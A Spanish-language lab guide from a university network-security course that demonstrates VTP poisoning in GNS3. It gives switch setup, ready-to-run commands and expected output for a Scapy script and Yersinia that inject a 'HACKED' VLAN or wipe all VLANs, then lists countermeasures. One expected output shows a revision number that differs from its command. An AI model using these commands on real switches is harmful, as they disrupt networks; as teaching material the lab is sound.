# VTP Attack — Agregar y Eliminar VLANs

> **Lab de Seguridad en Redes — ITLA 2024-1185**  
> Herramienta educativa para demostrar el envenenamiento del protocolo VTP en entornos controlados (GNS3).

---
Topología del Laboratorio

┌─────────────────────────────────────────────────────────┐
│                                                         │
│   Linux2024-1185-1 (eth0)                               │
│          │                                              │
│       e0/0 ◄──── ATAQUE DESDE AQUÍ                      │
│       IOU1  (VTP Server — Dominio: LAB)                 │
│       e0/1                                              │
│          │  [Trunk 802.1Q]                              │
│       e0/0                                              │
│       IOU2  (VTP Client — Dominio: LAB)                 │
│                                                         │
└─────────────────────────────────────────────────────────┘

DispositivoInterfazRolDescripciónLinux2024-1185-1eth0AtacanteKali Linux — envía frames VTPIOU1e0/0VTP ServerConectado al atacanteIOU1e0/1TrunkLink troncal hacia IOU2IOU2e0/0VTP ClientRecibe la DB de VTP desde IOU1


2. Concepto del Ataque VTP

VTP (VLAN Trunking Protocol) sincroniza la base de datos VLAN entre switches
del mismo dominio. El switch que tenga el número de revisión más alto gana y
todos los demás actualizan su DB.

Flujo del Ataque

Atacante (Linux)
       │
       │  ① Summary Advertisement
       │     revision = 35000  (mayor al actual)
       ▼
     IOU1  ──── "¡Revisión más alta! Acepto la nueva DB"
       │
       │  ② Subset Advertisement
       │     [ADD]  → incluye VLAN 666 "HACKED"
       │     [DEL]  → sin registros VLAN → DB vacía
       ▼
     IOU2  ──── Replica automáticamente la nueva DB

¿Por qué funciona?


VTPv1/v2 no autentica quién envía el frame (a menos que haya contraseña MD5)
Cualquier host puede forjar un frame 802.3 con destino 01:00:0c:cc:cc:cc
Un número de revisión más alto reemplaza la base de datos completa



3. Configuración de los Switches (Pre-ataque)

IOU1 — VTP Server

IOU1# configure terminal
IOU1(config)# vtp domain LAB
IOU1(config)# vtp mode server
IOU1(config)# vtp version 2
IOU1(config)# interface ethernet 0/1
IOU1(config-if)# switchport trunk encapsulation dot1q
IOU1(config-if)# switchport mode trunk
IOU1(config-if)# no shutdown
IOU1(config-if)# end

! Verificar estado VTP
IOU1# show vtp status
IOU1# show vlan brief

IOU2 — VTP Client

IOU2# configure terminal
IOU2(config)# vtp domain LAB
IOU2(config)# vtp mode client
IOU2(config)# interface ethernet 0/0
IOU2(config-if)# switchport trunk encapsulation dot1q
IOU2(config-if)# switchport mode trunk
IOU2(config-if)# no shutdown
IOU2(config-if)# end

! Verificar que recibe la DB de IOU1
IOU2# show vtp status
IOU2# show vlan brief

Verificar revisión actual (IMPORTANTE antes del ataque)

IOU1# show vtp status

Buscar la línea:

Configuration Revision  : 5       ← Tu --rev debe ser MAYOR a este número


4. Script Python — vtp_attack.py

Instalación de dependencia

bashpip install scapy

Sintaxis del comando

sudo python3 vtp_attack.py -i INTERFAZ --mode [add|delete]
                           [--vlan-id ID] [--vlan-name NOMBRE]
                           --domain DOMINIO --rev NUMERO

Parámetros

ParámetroTipoDescripción-istringInterfaz de red del atacante (eth0, e0, ens3)--modestringadd = agregar VLAN / delete = borrar VLANs--vlan-idintID de la VLAN a inyectar (solo con add)--vlan-namestringNombre de la VLAN (solo con add)--domainstringDominio VTP de los switches (ej: LAB)--revintNúmero de revisión (debe ser mayor al actual)


4.1 ATAQUE — Agregar VLAN

bashsudo python3 vtp_attack.py -i eth0 --mode add \
     --vlan-id 666 --vlan-name HACKED --domain LAB --rev 35000

Salida esperada:

══════════════════════════════════════════════════════
  [ATTACK] AGREGAR VLAN
  Interface : eth0
  VLAN ID   : 666
  VLAN Name : HACKED
  Dominio   : LAB
  Revisión  : 35000
══════════════════════════════════════════════════════

 [Paso 1/2] Enviando VTP Summary Advertisement...
 [Paso 2/2] Enviando VTP Subset Advertisement (VLAN 666)...

 [✓] VLAN 666 'HACKED' inyectada al dominio 'LAB'
 [*] Verificar en IOU1/IOU2 → show vlan brief

Verificación en IOU1 / IOU2:

IOU1# show vlan brief

VLAN Name                             Status    Ports
---- -------------------------------- --------- --------
1    default                          active    Et0/0, Et0/1
666  HACKED                           active           ← ¡INYECTADA!


4.2 ATAQUE — Borrar VLANs


⚠ Usar --rev con un valor mayor al usado en el ataque add (ej: 35001)



bashsudo python3 vtp_attack.py -i eth0 --mode delete \
     --domain LAB --rev 35001

Salida esperada:

══════════════════════════════════════════════════════
  [ATTACK] BORRAR TODAS LAS VLANs
  Interface : eth0
  Dominio   : LAB
  Revisión  : 35002
  ⚠  Causará interrupción de red en el dominio
══════════════════════════════════════════════════════

 [Paso 1/2] Enviando VTP Summary Advertisement...
 [Paso 2/2] Enviando VTP Subset Advertisement VACÍO...

 [✓] Base de datos VLAN vaciada en el dominio 'LAB'
 [*] Verificar en IOU1/IOU2 → show vlan brief

Verificación en IOU1 / IOU2:

IOU1# show vlan brief

VLAN Name                             Status    Ports
---- -------------------------------- --------- --------
1    default                          active    Et0/0, Et0/1
                                                ← Las demás VLANs desaparecen


5. Yersinia — Alternativa al Script

Yersinia es una herramienta incluida en Kali Linux especializada en ataques
de Capa 2. Sus ataques VTP son equivalentes al script.

5.1 Modo Interactivo (ncurses)

bashsudo yersinia -I

Pasos dentro del menú:
  1. Presionar  g  → seleccionar protocolo  → elegir VTP
  2. Presionar  F2 → editar campos (domain, vlan_id, vlan_name)
  3. Presionar  F3 → iniciar ataque
     Ataque 1: sending VTP packet       ← Agregar VLAN
     Ataque 2: deleting all VTP vlans   ← Borrar VLANs

5.2 Modo CLI — Agregar VLAN

bashsudo yersinia vtp -attack 1 \
     -interface eth0 \
     -domain LAB \
     -vlan 666 \
     -vlanname HACKED

5.3 Modo CLI — Borrar todas las VLANs

bashsudo yersinia vtp -attack 2 \
     -interface eth0 \
     -domain LAB

Comparación Script vs Yersinia

FunciónScript PythonYersiniaAgregar VLAN--mode add --vlan-id X --vlan-name Y-attack 1 -vlan X -vlanname YBorrar VLANs--mode delete-attack 2Control revisión--rev NUM (control total)Automático (menos control)PersonalizaciónAlta (Scapy, código abierto)LimitadaInstalaciónpip install scapyIncluido en Kali


6. Secuencia Completa del Ataque

bash# PASO 1 — Ver la revisión actual antes de atacar
# (En IOU1 o IOU2)
# IOU1# show vtp status → anotar "Configuration Revision"

# PASO 2 — Agregar VLAN maliciosa (rev mayor al actual)
sudo python3 vtp_attack.py -i eth0 --mode add \
     --vlan-id 666 --vlan-name HACKED --domain LAB --rev 35000

# PASO 3 — Verificar en el switch objetivo
# IOU1# show vlan brief
# IOU2# show vlan brief

# PASO 4 — Borrar todas las VLANs (rev mayor al paso 2)
sudo python3 vtp_attack.py -i eth0 --mode delete \
     --domain LAB --rev 35001

# PASO 5 — Verificar el impacto
# IOU1# show vlan brief
# IOU2# show vtp status


7. Contramedidas

ContramedidaComando en IOSUsar VTP Transparentvtp mode transparentHabilitar contraseña VTPvtp password CLAVE secretUsar VTPv3 (más seguro)vtp version 3Desactivar VTP completamentevtp mode off (IOS 12.2+)Resetear revisiónCambiar dominio y volver al originalPort Securityswitchport port-security en acceso


---


